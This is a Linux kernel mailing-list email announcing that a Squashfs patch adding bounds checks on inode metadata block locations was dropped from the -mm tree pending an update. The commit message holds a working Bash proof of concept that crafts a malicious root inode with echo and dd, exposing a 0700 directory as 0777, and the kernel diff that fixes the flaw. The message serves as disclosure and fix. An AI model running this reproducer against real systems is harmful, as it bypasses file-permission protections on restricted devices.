Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795585299;
	b=U52wT8jy7janK7ZQW8KrSmf0/R/szOTxNgxmTa1hzhczu+zF1I0GGrcQjzxKgsQVhK/G
	 cqwaVImlGNGu1hQzYABFkm4+KElXFNmVEMvyhbGIWrlqYRKapKmPdfH3QZO50utEOY7X4
	 Wp0/qenWI/CpR2LoiN35cSPPxbGWgysnugnxc4xzw7KQ//7THeUSlq/zWUWcE7G/OG8sm
	 MPh7P43PS7LlLHQPhEj5GBL5eHqOp18h55exgd+ex88gCCM3XSlCPZQN/Fu2q0Eh5dU32
	 P8jFK9gsXlb3D7cRkYJaZw9jQFQTmrslAG8g4gMfj91JR0xeJWtjacWqNw48ICSOGqA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795585299;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=VHmwREG9/PCGgIDQnfVfUpa+KbO4Dmc6uaaQguRHXC0=;
	b=Kc+s7er/iDiv8fp/j3u7FYxmZryALGijYHf6DrU6CYXTxJipVn18XPVe+GQbWuIXCzBG
	 /CMrUNJ6ZT9sHfLOixAhqSKAhqkehzqTCqutcqnfab4Hmr0x2P6Mb3FeGLD+lZ6NgjNqz
	 FHVlRWBAHvv97BkpVWij9xOTRhGr+JwvGdySL4ycyHHRPBHGmhbtDyN0Lwmla5LtHvycu
	 m39mnwZXvXH7HTDZ2TKh+3H/4IZHbrAp1jtQ5r1uGbhC0xpGL7MRm4xuziIdxorN9XiMk
	 R+2dcc4moOFY514uAosdjI+NukfcYcnhCdqejd+OQqwjNIM2+k7tRfWmWi2BlWBICUQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=kNqkxCMk;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A0F50606A31E
	for <mm-commits@vger.kernel.org>; Wed, 25 Nov 2026 05:41:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=kNqkxCMk
Received: by smtp.kernel.org (Postfix) with ESMTPSA id E82EC1F000D1;
	Wed, 25 Nov 2026 05:41:38 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795585299;
	bh=VHmwREG9/PCGgIDQnfVfUpa+KbO4Dmc6uaaQguRHXC0=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=kNqkxCMkFK3j3lsasOmQmyahNmZi2ef1/oCKtIUHtEx5nm+SQvLvl+ul4SoBu4QfN
	 ut5ZTjhkLmg1Oi7XVt1g8FFjyvbBsy1Ao3REaGOWcQ7zQtq8xManaatG+LBSvFqaYW
	 GbyLr1rMR1yXrG07tMdb0f/KzDFgzrtFt3hM56a8=
Date: Tue, 24 Nov 2026 21:41:38 -0800
To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
	akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261123034304.261742-12-phillip@squashfs.org.uk>
References: <20261123034304.261742-12-phillip@squashfs.org.uk>
Subject: [to-be-updated] squashfs-sanity-check-inode-metadata-block-location.patch removed from -mm tree
Message-Id: <20261125054138.E82EC1F000D1@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The quilt patch titled
     Subject: Squashfs: sanity check inode metadata block location
has been removed from the -mm tree.  Its filename was
     squashfs-sanity-check-inode-metadata-block-location.patch

This patch was dropped because an updated version will be issued

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: sanity check inode metadata block location
Date: Mon, 23 Nov 2026 03:42:52 +0000

An inode reference in Squashfs is represented as a tuple, the location
of the compressed metadata block the inode is in, and the offset into
the uncompressed block.  The location is not absolute and it is instead
encoded as an offset from the start of the inode table.

An attacker could manipulate the inode reference to make it point to a
replacement malicious inode stored elsewhere, outside the inode table.
This is because the code does not check that the location is valid and
is within the inode table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to hide a malicious inode.

Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliberately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem root directory has
permissions 0700 (u=rxw), where only the superuser can enter the
directory and access the content within. But using this bug an attacker
could place a malicious root inode in the inode lookup table (used by
NFS) which has the permissions changed to 0777 (a=rwx), and then update
the root_inode field in the superblock to point to that.  On
reboot/remount this will make the directory accesisible to unprivileged
users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_inode_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the inode is within the inode table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the root directory
permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
is unchanged.

======================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
for i in $(seq 1 100); do
	echo "$i l zero" >> pseudo
done

# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# The root_inode field in the superblock points to the compressed metadata
# block and offset within it, where the root inode is stored.
#
# Create a malicious root inode and hide it in the inode lookup table.
# Because of mount time checking, there are no gaps between metadata tables
# where it can be hidden, and it can't be hidden after the file system end,
# because this is checked.

# Write malicious inode, this is the same as the original root inode, except
# it is uncompressed, and the permissions are set to 0777.
/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
\x00" > file

# Place new root inode inside the inode lookup table
echo Place new root inode inside the inode lookup table

dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new inode
# The start block is an offset from the inode_table_start, and not an
# absolute value.  The start of the inode table is 113, the new inode
# is placed at position 964, and so the offset is 851. Because we've only
# stored one inode in the metadata block, the offset into that block is 0.
#
echo Update the root_inode field in the superblock to point to our new inode

/usr/bin/echo -en "\x00\x00\x4f\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt, if the exploit is successful, permissions should be 0777
echo Stat /mnt, if the exploit is successful, permissions should be 0777

stat /mnt

popd 2>&1> /dev/null

rm -rf $DIR
======================================================================

Link: https://patch.msgid.link/20261123034304.261742-12-phillip@squashfs.org.uk
Fixes: 6545b246a2c8 (" Squashfs: inode operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>

 fs/squashfs/inode.c            |   17 ++++++++++-------
 fs/squashfs/squashfs_helpers.h |   18 ++++++++++++++++++
 2 files changed, 28 insertions(+), 7 deletions(-)

--- a/fs/squashfs/inode.c~squashfs-sanity-check-inode-metadata-block-location
+++ a/fs/squashfs/inode.c
@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *in
 {
 	struct super_block *sb = inode->i_sb;
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
-	int offset = squashfs_inode_offset(ino);
+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
+	int offset = squashfs_inode_offset(ino), soffset = offset;
 	int err, type;
 	union squashfs_inode squashfs_ino;
 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
@@ -118,11 +118,14 @@ int squashfs_read_inode(struct inode *in
 
 	TRACE("Entered squashfs_read_inode\n");
 
+	if (block < 0)
+		goto bad_block_val;
+
 	/*
 	 * Read inode base common to all inode types.
 	 */
-	err = squashfs_read_metadata(sb, sqshb_ino, &block,
-				&offset, sizeof(*sqshb_ino));
+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
+				&soffset, sizeof(*sqshb_ino));
 	if (err < 0)
 		goto failed_read;
 
@@ -130,9 +133,6 @@ int squashfs_read_inode(struct inode *in
 	if (err)
 		goto failed_read;
 
-	block = squashfs_inode_blk(ino) + msblk->inode_table;
-	offset = squashfs_inode_offset(ino);
-
 	type = le16_to_cpu(sqshb_ino->inode_type);
 	switch (type) {
 	case SQUASHFS_REG_TYPE: {
@@ -464,6 +464,9 @@ int squashfs_read_inode(struct inode *in
 
 	return 0;
 
+bad_block_val:
+	err = block;
+
 failed_read:
 	ERROR("Unable to read inode 0x%llx\n", ino);
 	return err;
--- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-inode-metadata-block-location
+++ a/fs/squashfs/squashfs_helpers.h
@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(
 	return inode & 0xffff;
 }
 
+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
+{
+	s64 start;
+
+	if (inode < 0)
+		return -EINVAL;
+
+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
+		return -EINVAL;
+
+	start = msblk->inode_table + squashfs_inode_blk(inode);
+
+	if (start >= msblk->directory_table)
+		return -EINVAL;
+
+	return start;
+}
+
 static inline s64 squashfs_mkinode(u32 start, u16 offset)
 {
 	return ((s64)start << 16) | offset;
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-sanity-check-directory-metadata-block-location.patch
squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-or-size_t.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch

